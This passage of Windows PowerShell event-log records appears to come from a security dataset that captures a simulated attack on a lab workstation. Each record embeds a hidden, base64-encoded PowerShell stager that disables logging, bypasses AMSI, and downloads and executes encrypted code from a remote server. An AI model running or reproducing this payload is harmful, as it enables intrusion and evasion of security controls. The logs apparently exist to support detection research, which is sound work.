{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":600,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Message":"Provider \"Environment\" is Started. \r\n\r\nDetails: \r\n\tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=28371\r\n\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","@timestamp":"2020-09-22T08:22:43.272Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240718,"Task":6,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Provider Lifecycle","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":600,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Message":"Provider \"FileSystem\" is Started. \r\n\r\nDetails: \r\n\tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=28373\r\n\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","@timestamp":"2020-09-22T08:22:43.273Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240719,"Task":6,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Provider Lifecycle","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":600,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Message":"Provider \"Function\" is Started. \r\n\r\nDetails: \r\n\tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=28375\r\n\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADU